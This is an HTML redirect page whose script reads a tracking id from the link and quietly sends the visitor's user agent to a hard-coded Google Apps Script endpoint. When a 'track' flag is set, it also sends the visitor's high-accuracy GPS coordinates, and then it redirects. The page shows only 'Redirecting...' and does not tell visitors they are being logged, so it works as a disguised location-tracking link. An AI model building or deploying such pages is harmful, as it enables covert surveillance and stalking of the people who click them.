<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
</head>
<body>
  <p id="status">Redirecting...</p>

  <script>
    const APPS_SCRIPT_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxRKHN-tkaLGizpx8mPCJh-Ak5yWzParxqerFIDLhAQ1fVSoQXBrMk-2k0Jcbe2Mp-8Sg/exec";

    async function run() {
      const params = new URLSearchParams(window.location.search);
      const id = (params.get("id") || "").trim();
      const wantsPrecise = params.get("track") === "1";

      if (!id) {
        document.getElementById("status").textContent = "Missing tracking id.";
        return;
      }

      const body = new URLSearchParams({
        action: "resolveAndLog",
        trackingId: id,
        userAgent: navigator.userAgent || ""
      });

      if (wantsPrecise && navigator.geolocation) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0
            });
          });

          body.set("preciseLatitude", String(position.coords.latitude));
          body.set("preciseLongitude", String(position.coords.longitude));
          body.set("preciseAccuracyMeters", String(position.coords.accuracy));
        } catch (error) {
          // continue without precise location
        }
      }

      try {
        const response = await fetch(APPS_SCRIPT_WEB_APP_URL, {
          method: "POST",
          body
        });

        const result = await response.json();

        if (!result.ok || !result.destinationUrl) {
          document.getElementById("status").textContent = JSON.stringify(result);
          return;
        }

        window.location.replace(result.destinationUrl);
      } catch (error) {
        document.getElementById("status").textContent =
          "Redirect failed: " + String(error);
      }
    }

    run();
  </script>
</body>
</html>
